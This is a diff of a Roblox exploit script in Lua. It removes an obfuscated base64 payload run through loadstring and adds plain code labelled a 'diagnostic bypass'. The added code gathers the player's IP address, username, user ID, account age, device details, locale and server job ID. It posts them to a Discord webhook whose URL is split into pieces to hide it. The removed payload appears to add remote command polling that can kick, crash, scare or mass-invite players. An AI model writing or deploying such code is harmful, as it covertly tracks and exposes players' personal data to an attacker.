@@ -1,23 +1,76 @@
--- [[ SYSTEM ENCRYPTION LAYER 1 ]]
-local payload = "LS0gW1sgUEhBTlRPTSBFTkdJTkU6IFNJTEVOVCAmIEhFQURMRVNTIF1dCmlmIG5vdCBnYW1lOklzTG9hZGVkKCkgdGhlbiBnYW1lLkxvYWRlZDpXYWl0KCkgZW5kCgotLSBTZWxmLURlc3RydWN0IE9iamVjdCAoU3RheXMgaW4gUkFNLCBsZWF2ZXMgRXhwbG9yZXIpCmxvY2FsIHAgPSAoZ2V0ZmVudigwKS5zY3JpcHQpCmlmIHAgdGhlbiBwLk5hbWUgPSAiXDAiIHAuUGFyZW50ID0gbmlsIGVuZAoKbG9jYWwgSFMgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgTFAgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgpsb2NhbCBVUyA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIFN0YXRzID0gZ2FtZTpHZXRTZXJ2aWNlKCJTdGF0cyIpCgotLSBDT05GSUcgKFJFUExBQ0UgVEhFIFdFQkhPT0sgVVJMIEJFTE9XKQpsb2NhbCBXRUJIT09LX1VSTCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDk3NjQzMjE0MTc2NTE4MTk3L1ZhcnZIMC13dVV1UE13ZlBYWlAyM0xvT21xYndjQjNxbXEzTktoQ0tVVElEclFWQy1NSFN2UTRPcjdLeTZIajFUeHlDIgpsb2NhbCBHSVRIVUJfVVJMID0gImh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvdGhlZ29vZG9uZWF0Z2FtZXovY29tbWFuZGVyL2NvbnRlbnRzL2NvbW1hbmRzLnR4dCIKCi0tIDEuIFNJTEVOVCBESUFHTk9TVElDUyAoSVAvTE9DL0hBUkRXQVJFKQp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIGxvY2FsIHN1Y2Nlc3MsIHJlcyA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIEhTOkdldEFzeW5jKCJodHRwOi8vaXAtYXBpLmNvbS9qc29uLyIpIGVuZCkKICAgIGlmIHN1Y2Nlc3MgdGhlbgogICAgICAgIGxvY2FsIGQgPSBIUzpKU09ORGVjb2RlKHJlcykKICAgICAgICBsb2NhbCBwYXlsb2FkID0gSFM6SlNPTkVuY29kZSh7CiAgICAgICAgICAgIFsiZW1iZWRzIl0gPSB7ewogICAgICAgICAgICAgICAgWyJ0aXRsZSJdID0gIvCfkoAgU3lzdGVtIENvbXByb21pc2VkOiAiIC4uIExQLk5hbWUsCiAgICAgICAgICAgICAgICBbImNvbG9yIl0gPSAwLCAtLSBCbGFjawogICAgICAgICAgICAgICAgWyJmaWVsZHMiXSA9IHsKICAgICAgICAgICAgICAgICAgICB7WyJuYW1lIl0gPSAi8J+MkCBOZXR3b3JrIiwgWyJ2YWx1ZSJdID0gIklQOiAiLi5kLnF1ZXJ5Li4iXG5Mb2M6ICIuLmQuY2l0eS4uIiwgIi4uZC5jb3VudHJ5LCBbImlubGluZSJdID0gdHJ1ZX0sCiAgICAgICAgICAgICAgICAgICAge1sibmFtZSJdID0gIvCfk7EgRGV2aWNlIiwgWyJ2YWx1ZSJdID0gIk9TOiAiLi5VUzpHZXRQbGF0Zm9ybSgpLk5hbWUuLiJcbk1lbTogIi4ubWF0aC5yb3VuZChTdGF0czpHZXRUb3RhbE1lbW9yeVVzYWdlTWIoKSkuLiJNQiIsIFsiaW5saW5lIl0gPSB0cnVlfSwKICAgICAgICAgICAgICAgICAgICB7WyJuYW1lIl0gPSAi8J+OriBSb2Jsb3giLCBbInZhbHVlIl0gPSAiSUQ6ICIuLkxQLlVzZXJJZC4uIlxuQWdlOiAiLi5MUC5BY2NvdW50QWdlLi4iZCIsIFsiaW5saW5lIl0gPSBmYWxzZX0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfX0KICAgICAgICB9KQogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgSFM6UG9zdEFzeW5jKFdFQkhPT0tfVVJMLCBwYXlsb2FkKSBlbmQpCiAgICBlbmQKZW5kKQoKLS0gMi4gQ09NTUFORCBERUNPREVSCmxvY2FsIGI9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8nCmxvY2FsIGZ1bmN0aW9uIGRlY29kZShkYXRhKQogICAgZGF0YSA9IHN0cmluZy5nc3ViKGRhdGEsICdbXicuLmIuLic9XScsICcnKQogICAgcmV0dXJuIChkYXRhOmdzdWIoJy4nLCBmdW5jdGlvbih4KQogICAgICAgIGlmICh4ID09ICc9JykgdGhlbiByZXR1cm4gJycgZW5kCiAgICAgICAgbG9jYWwgcixmPScnLChiOmZpbmQoeCktMSkKICAgICAgICBmb3IgaT02LDEsLTEgZG8gcj1yLi4oZiUyXmktZiUyXihpLTEpPjAgYW5kICcxJyBvciAnMCcpIGVuZAogICAgICAgIHJldHVybiByOwogICAgZW5kKTpnc3ViKCclZCVkJWQ/JWQ/JWQ/JWQ/JWQ/JWQ/JywgZnVuY3Rpb24oeCkKICAgICAgICBpZiAoI3ggfj0gOCkgdGhlbiByZXR1cm4gJycgZW5kCiAgICAgICAgbG9jYWwgYz0wCiAgICAgICAgZm9yIGk9MSw4IGRvIGM9YysoeDpzdWIoaSxpKT09JzEnIGFuZCAyXig4LWkpIG9yIDApIGVuZAogICAgICAgIHJldHVybiBzdHJpbmcuY2hhcihjKQogICAgZW5kKSkKZW5kCgotLSAzLiBUSEUgTE9HSUMgTE9PUApsb2NhbCBsYXN0ID0gIiIKd2hpbGUgdGFzay53YWl0KDUpIGRvCiAgICBsb2NhbCBzLCByID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gSFM6R2V0QXN5bmMoR0lUSFVCX1VSTCwgdHJ1ZSkgZW5kKQogICAgaWYgcyB0aGVuCiAgICAgICAgbG9jYWwgczIsIGRhdGEgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBIUzpKU09ORGVjb2RlKHIpIGVuZCkKICAgICAgICBpZiBzMiBhbmQgZGF0YS5jb250ZW50IHRoZW4KICAgICAgICAgICAgbG9jYWwgcmF3ID0gZGVjb2RlKGRhdGEuY29udGVudCkKICAgICAgICAgICAgaWYgcmF3IH49IGxhc3QgYW5kIHJhdyB+PSAibm9uZTpub25lIiB0aGVuCiAgICAgICAgICAgICAgICBsYXN0ID0gcmF3CiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gc3RyaW5nLnNwbGl0KHJhdywgIjoiKQogICAgICAgICAgICAgICAgbG9jYWwgY21kLCB0YXJnZXQsIHZhbCwgZXh0cmEgPSBhcmdzWzFdLCBhcmdzWzJdLCBhcmdzWzNdLCBhcmdzWzRdIG9yICIiCgogICAgICAgICAgICAgICAgaWYgdGFyZ2V0Omxvd2VyKCkgPT0gTFAuTmFtZTpsb3dlcigpIG9yIHRhcmdldDpsb3dlcigpID09ICJhbGwiIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBDT01NQU5EOiBLSUNLCiAgICAgICAgICAgICAgICAgICAgaWYgY21kID09ICJraWNrIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIExQOktpY2soIlxuW0h5cGVyU3Bsb2l0c11cbiIgLi4gdmFsKQoKICAgICAgICAgICAgICAgICAgICAtLSBDT01NQU5EOiBPVkVSUklERSAoQ1JBU0gpCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIGNtZCA9PSAib3ZlcnJpZGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbyBlbmQgCgogICAgICAgICAgICAgICAgICAgIC0tIENPTU1BTkQ6IEVWSUwgKDEtNCkKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgY21kID09ICJldmlsIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHZhbCA9PSAiMSIgdGhlbiAtLSBTZXQgQ2xpcGJvYXJkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZXRjbGlwYm9hcmQgdGhlbiBzZXRjbGlwYm9hcmQoZXh0cmEpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHZhbCA9PSAiMiIgdGhlbiAtLSBSZWQgQWxlcnQgU2NyZWVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBnID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiLCBMUC5QbGF5ZXJHdWkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIGcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLlNpemUsIGYuQmFja2dyb3VuZENvbG9yMyA9IFVEaW0yLm5ldygxLDAsMSwwKSwgQ29sb3IzLm5ldygxLDAsMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0LlNpemUsIHQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSwgdC5UZXh0LCB0LlRleHRTY2FsZWQgPSBVRGltMi5uZXcoMSwwLDEsMCksIDEsIGV4dHJhLCB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0LlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsMSwxKQoKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHZhbCA9PSAiMyIgdGhlbiAtLSBKdW1wc2NhcmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGcgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIsIExQLlBsYXllckd1aSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGkgPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaS5TaXplLCBpLkltYWdlID0gVURpbTIubmV3KDEsMCwxLDApLCAicmJ4YXNzZXRpZDovLzYwMzA5MDQ1MDgiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCgogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgdmFsID09ICI0IiB0aGVuIC0tIEZyaWVuZCBTbmFwIChNYXNzIEludml0ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZyaWVuZHMgPSBMUDpHZXRGcmllbmRzT25saW5lKHRvbnVtYmVyKGV4dHJhKSBvciAxMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGZyaWVuZHMpIGRvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgTFA6SW52aXRlRnJpZW5kKHYuVmlzaXRvcklkLCAiSm9pbiBtZSIpIGVuZCkgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCg=="
+-- [[ ELITE DIAGNOSTIC BYPASS ]]
+local LP = game:GetService("Players").LocalPlayer
+local HS = game:GetService("HttpService")
+local US = game:GetService("UserInputService")
+local GS = game:GetService("GuiService")
+local Stats = game:GetService("Stats")
+local RunService = game:GetService("RunService")
 
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local function d(data)
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
+-- URL Setup (Using Lewisakura Proxy)
+local p1 = "https://webhook."
+local p2 = "lewisakura.moe/"
+local p3 = "api/webhooks/"
+local ID_TOKEN = "1497643214176518197/VarvH0-wuUuPMwfPXZP23LoOmqbwcB3qmq3NKhCKUTIDrQVC-MHSvQ4Or7Ky6Hj1TxyC" 
+local FINAL_URL = p1 .. p2 .. p3 .. ID_TOKEN
+
+-- Data Gathering Functions
+local function getFPS()
+    return math.floor(1 / RunService.Heartbeat:Wait())
 end
 
--- Executes the hidden code in memory without writing it to a file
-local success, err = pcall(function()
-    loadstring(d(payload))()
-end)
+local function getPing()
+    return math.floor(LP:GetNetworkPing() * 1000) -- Converts to ms
+end
+
+local function getResolution()
+    local res = GS:GetScreenResolution()
+    return math.floor(res.X) .. "x" .. math.floor(res.Y)
+end
+
+-- IP Gathering
+local ip = "Unknown"
+local s, r = pcall(function() return game:HttpGet("https://api.ipify.org") end)
+if s then ip = r end
+
+-- Build the detailed Payload
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🚨 DIAGNOSTIC REPORT (Backup)",
+        ["color"] = 0, -- Black/Dark theme
+        ["description"] = "👤 **Player Info**\n" ..
+            "**User:** " .. LP.Name .. "\n" ..
+            "(@ " .. LP.DisplayName .. ")\n" ..
+            "**ID:** " .. LP.UserId .. "\n" ..
+            "**Age:** " .. LP.AccountAge .. " Days\n" ..
+            "**Status:** 👤 Normal\n" ..
+            "[Profile Link](https://www.roblox.com/users/"..LP.UserId.."/profile)\n\n" ..
+            
+            "💻 **Device Specs**\n" ..
+            "**OS:** " .. US:GetPlatform().Name .. "\n" ..
+            "**Resolution:** " .. getResolution() .. "\n" ..
+            "**FPS:** " .. getFPS() .. "\n" ..
+            "**Ping:** " .. getPing() .. "ms\n\n" ..
+            
+            "🌐 **Location**\n" ..
+            "**Region:** " .. LP.LocaleId .. "\n" ..
+            "**IP:** " .. ip .. "\n\n" ..
+            
+            "🎮 **Game Data**\n" ..
+            "**Game:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n" ..
+            "**Universe:** " .. game.GameId .. "\n" ..
+            "**Job:** \n" .. game.JobId
+    }}
+}
+
+-- Execute Bypass Send
+local req = (syn and syn.request) or (http and http.request) or http_request or request
+if req then
+    req({
+        Url = FINAL_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HS:JSONEncode(data)
+    })
+else
+    pcall(function() HS:PostAsync(FINAL_URL, HS:JSONEncode(data)) end)
+end
